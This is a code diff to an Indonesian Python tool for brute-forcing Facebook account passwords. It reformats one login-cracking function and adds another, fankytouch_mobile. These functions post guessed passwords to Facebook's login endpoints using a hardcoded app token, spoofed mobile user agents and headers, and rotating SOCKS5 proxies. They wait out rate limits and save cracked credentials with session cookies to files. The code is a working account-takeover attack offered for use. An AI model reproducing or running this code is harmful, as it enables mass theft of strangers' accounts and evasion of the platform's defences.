@@ -116,83 +116,6 @@ except:
 	simcard = []
 	pass
 
-#USER AGENT HP INI TAI GOSAH DI GANTI UDAH GACOR
-def generate_android_ua():
-    android_versions = ["7.0", "8.1.0", "9", "10", "11", "12", "13", "14"]
-
-    devices = [
-        # REDMI (Lebih sering muncul Redmi Note 9)
-        "Redmi Note 9", "Redmi Note 9 Pro", "Redmi Note 8", "Redmi Note 10", "Redmi 9A", 
-        "Redmi 10C", "Redmi K40", "Redmi K50", "Redmi 8", "Redmi 10X",
-        # VIVO
-        "Vivo Y20", "Vivo V21", "Vivo X60", "Vivo Y12", "Vivo Y50", "Vivo Y53s",
-        # OPPO
-        "Oppo A92", "Oppo Reno 5", "Oppo F11 Pro", "Oppo A74", "Oppo A3s", "Oppo A15",
-        # REALME
-        "Realme 7", "Realme C25", "Realme Narzo 30", "Realme GT Neo", "Realme 9i", "Realme 8 Pro",
-        # NOKIA
-        "Nokia 5.4", "Nokia 3.1", "Nokia G50", "Nokia 8.3", "Nokia X10", "Nokia C20",
-        # INFINIX
-        "Infinix Note 10", "Infinix Hot 9", "Infinix Zero 8", "Infinix Smart 5", "Infinix S5",
-        # SAMSUNG
-        "Samsung Galaxy S21", "Samsung Galaxy S10", "Samsung Galaxy A12", "Samsung Galaxy M32",
-        "Samsung Galaxy A71", "Samsung Galaxy A52s", "Samsung Galaxy M51",
-        # HUAWEI
-        "Huawei P30", "Huawei P40 Pro", "Huawei Nova 7", "Huawei Y9 Prime", "Huawei Mate 30",
-        # ASUS
-        "Asus ROG Phone 5", "Asus Zenfone 8", "Asus ROG Phone 6", "Asus Zenfone Max Pro M1",
-        # POCO
-        "Poco X3", "Poco M3", "Poco F3", "Poco X4 GT", "Poco C40",
-        # ONEPLUS
-        "OnePlus Nord", "OnePlus 8T", "OnePlus 9 Pro", "OnePlus 7T", "OnePlus 10R",
-        # SONY
-        "Sony Xperia 1 III", "Sony Xperia 5 II", "Sony Xperia 10 II", "Sony Xperia XZ3",
-        # MOTOROLA
-        "Moto G Power", "Moto G Stylus", "Moto Edge 20", "Moto G9 Play", "Moto E7 Plus"
-    ]
-
-    chrome_versions = f"{random.randint(100, 120)}.0.{random.randint(4000, 9999)}.{random.randint(40, 150)}"
-    
-    dalvik_versions = [
-        "Dalvik/2.1.0 (Linux; U; Android", "Dalvik/2.1.0 (Linux; Android",
-        "Dalvik/2.1.0 (Linux; U; Android", "Dalvik/1.6.0 (Linux; U; Android",
-        "Dalvik/1.4.0 (Linux; U; Android"
-    ]
-
-    mozilla_variants = [
-        "Mozilla/5.0 (Linux; Android", "Mozilla/5.0 (X11; Android",
-        "Mozilla/5.0 (Linux; U; Android", "Mozilla/5.0 (Mobile; Android"
-    ]
-
-    # Mozilla UA
-    mozilla_ua = f"{random.choice(mozilla_variants)} {random.choice(android_versions)}; {random.choices(devices, weights=[5 if 'Redmi Note 9' in d else 1 for d in devices], k=1)[0]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versions} Mobile Safari/537.36"
-
-    # Dalvik UA
-    dalvik_ua = f"{random.choice(dalvik_versions)} {random.choice(android_versions)}; {random.choice(devices)})"
-
-    return random.choice([mozilla_ua, dalvik_ua])
-
-def generate_headers():
-    """Generate random headers untuk setiap request"""
-    accept_list = [
-        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "application/json, text/javascript, */*; q=0.01",
-        "*/*",
-        "text/plain, */*; q=0.01"
-    ]
-    encoding_list = ["gzip, deflate", "br, gzip, deflate", "identity"]
-    language_list = ["en-US,en;q=0.5", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8"]
-
-    headers = {
-        "User-Agent": generate_android_ua(),
-        "Referer": "https://www.google.com/",
-        "Accept": random.choice(accept_list),
-        "Accept-Encoding": random.choice(encoding_list),
-        "Accept-Language": random.choice(language_list),
-        "Connection": "keep-alive"
-    }
-    return headers
-
 # ------------------[ USER-AGENT ]-------------------#
 def uaku():
     try:
@@ -220,7 +143,14 @@ try:
 		ugen.append(fn)
 except :
 	ugent = "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"
-	
+	ua_list = [
+    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.129 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.129 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.129 Mobile Safari/537.36"
+]
+import random
+ua = random.choice(ua_list)  # Pilih UA secara acak
+headers = {"User-Agent": ua}
 
 for t in range(1000):
     rc = random.choice
@@ -1567,7 +1497,7 @@ def metcepat():
     urut.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
     wa.print(Columns(urut))
     awal = datetime.datetime.now()
-    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',title=f"[bold yellow]CRACK-CEPAT-FENDI-GANTENG",width=60,style=f"{color_panel}"))
+    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',title=f"[bold yellow]CRACK-CEPAT-FANKY-GANTENG",width=60,style=f"{color_panel}"))
     prog = Progress(TextColumn('{task.description}'))
     des = prog.add_task('',total=len(id2))
     with prog:
@@ -1692,18 +1622,46 @@ def fankygraphv1(idf, pwv, url):
     ses = requests.Session()
     prog.update(des, description=f" {K2}•{H2} FENDI GRAPH {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
-    #ua = f"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
-    ua = random.choice(ugen)
+    ua = random.choice(ugen)  # Random User-Agent
     for pw in pwv:
         try:
             if 'ya' in ualuh: 
-                ua = ualu[0]
-            nip = random.choice(prox)
-            proxs = {'http': 'socks5://' + nip}
-            params = ({ "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": random.randint(1, 26), "email": idf, "locale": "zh_CN", "password": pw, "sdk": "Android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5" })
-            headers = ({ "Host": url, "x-fb-sim-hni": str(random.randint(100000, 300000)), "x-fb-net-hni": str(random.randint(100000, 300000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-device-group": f"{str(random.randint(1000, 4000))}", "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery", "x-fb-request-analytics-tags": "unknown", "accept-encoding": "gzip, deflate", "x-fb-http-engine": "Liger", "connection": "close" })
-            post = requests.post(f"https://{url}/auth/login?locale=zh_CN", params=params, headers=headers, allow_redirects=False,proxies=proxs)
+                ua = ualu[0]  # Gunakan User-Agent khusus jika ada
+            nip = random.choice(prox) if prox else None  # Pilih proxy secara acak (opsional)
+            proxs = {'http': 'socks5://' + nip, 'https': 'socks5://' + nip} if nip else None  # Set proxy jika ada
 
+            # Parameter untuk permintaan POST
+            params = {
+                "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
+                "sdk_version": random.randint(1, 26),
+                "email": idf,
+                "locale": "zh_CN",
+                "password": pw,
+                "sdk": "Android",
+                "generate_session_cookies": "1",
+                "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+            }
+
+            # Header untuk permintaan POST
+            headers = {
+                "Host": url,
+                "x-fb-sim-hni": str(random.randint(100000, 300000)),
+                "x-fb-net-hni": str(random.randint(100000, 300000)),
+                "x-fb-connection-quality": "EXCELLENT",
+                "user-agent": ua,
+                "content-type": "application/x-www-form-urlencoded",
+                "x-fb-device-group": f"{str(random.randint(1000, 4000))}",
+                "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery",
+                "x-fb-request-analytics-tags": "unknown",
+                "accept-encoding": "gzip, deflate",
+                "x-fb-http-engine": "Liger",
+                "connection": "close"
+            }
+
+            # Kirim permintaan POST
+            post = ses.post(f"https://{url}/auth/login?locale=zh_CN", params=params, headers=headers, allow_redirects=False, proxies=proxs)
+
+            # Cek respons
             if "User must verify their account" in post.text:
                 cp += 1
                 tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
@@ -1716,29 +1674,29 @@ def fankygraphv1(idf, pwv, url):
 
             elif "session_key" in post.text and "EAA" in post.text:
                 ok += 1
-                kuki = ";".join(i["name"] + "=" + i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(.*?)", kuki)[0]
+                kuki = ";".join(i["name"] + "=" + i["value"] for i in post.json()["session_cookies"])
+                user = re.findall("c_user=(.*?)", kuki)[0]
                 tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                 tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                 prints(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
+                open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
                 break
 
             elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
                 prog.update(des, description=f" {K2}•{K2} SPAM {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]", end="")
                 prog.advance(des)
-                time.sleep(10)
+                time.sleep(10)  # Tunggu 10 detik jika terkena rate limit
 
             else:
-                continue
+                continue  # Lanjutkan ke password berikutnya jika tidak ada respons yang valid
 
         except requests.exceptions.ConnectionError:
-            time.sleep(31)
+            time.sleep(31)  # Tunggu 31 detik jika terjadi kesalahan koneksi
 
-    loop += 1
-
+    loop += 1  # Tambah counter loop
 
 #-------------------[ CRACK-MAIN ]------------#
 def fankywww(idf, pwv):
@@ -1949,6 +1907,107 @@ def fankytouch(idf,pwv):
 			time.sleep(31)
 	loop+=1
 
+#-----------------CRACK-MAIN---------------#
+def fankytouch_mobile(idf, pwv):
+    global loop, ok, cp
+    rr = random.randint
+    rc = random.choice
+    bo = random.choice([m, k, h, b, u, x])
+    ua = random.choice(ugen)
+    ses = requests.Session()
+    prog.update(des, description=f" {K2}•{H2} FENDI MTOUCH {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.advance(des)
+    for pw in pwv:
+        try:
+            if 'ya' in ualuh: ua = ualu[0]
+            nip = random.choice(prox)
+            proxs = {'http': 'socks5://' + nip}
+            getfan = "https://m.facebook.com/login.php"
+            requ = ses.get(getfan)
+            koki = (";").join(["%s=%s" % (key, value) for key, value in requ.cookies.get_dict().items()])
+            headers = {
+                "User-Agent": ua,
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+                "Referer": "https://m.facebook.com/",
+                "Origin": "https://m.facebook.com",
+                "Upgrade-Insecure-Requests": "1",
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-User": "?1",
+                "DNT": "1",
+                "TE": "trailers",
+                "X-Requested-With": "com.facebook.katana"
+            }
+            data = {
+                "lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1),
+                "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1),
+                "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1),
+                "li": re.search('name="li" value="(.*?)"', requ.text).group(1),
+                "try_number": "0",
+                "unrecognized_tries": "0",
+                "email": idf,
+                "pass": pw,
+                "encpass": f"#PWD_BROWSER:0:{int(time.time())}:{pw}",
+                "prefill_contact_point": idf,
+                "prefill_source": "browser_dropdown",
+                "prefill_type": "password_autofill",
+                "first_prefill_source": "browser_dropdown",
+                "first_prefill_type": "password_autofill",
+                "had_cp_prefilled": "true",
+                "had_password_prefilled": "true",
+                "is_smart_lock": "true",
+                "bi_xrwh": "0",
+                "_fb_noscript": "true",
+                "source": "login",
+                "lgndim": "eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwMzEsImMiOjI0fQ==",
+                "timezone": "-420",
+                "lgndim": "2560,1440,2",
+                "guid": str(uuid.uuid4()),
+                "login_source": "login",
+                "meta_inf_fbmeta": "",
+                "skip_api_login": "1",
+                "api_key": "882a8490361da98702bf97a021ddc14d",
+                "signed_next": "1",
+                "next": "https://m.facebook.com/",
+                "fb_dtsg": "",
+                "checked_login": "true",
+                "ab_test_data": "",
+                "login_attempt": "1",
+                "sso_device": "mobile",
+                "sso_version": "2.0"
+            }
+            fankyurl = "https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9"
+            po = ses.post(fankyurl, headers=headers, cookies={'cookie': koki}, data=data)
+            if "checkpoint" in ses.cookies.get_dict().keys():
+                cp += 1
+                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+                break
+            elif "c_user" in ses.cookies.get_dict().keys():
+                ok += 1
+                coki = ses.cookies.get_dict()
+                kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
+                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop += 1
 
 # -----------------------[ SYSTEM-CONTROL ]--------------------#
 if __name__ == "__main__":
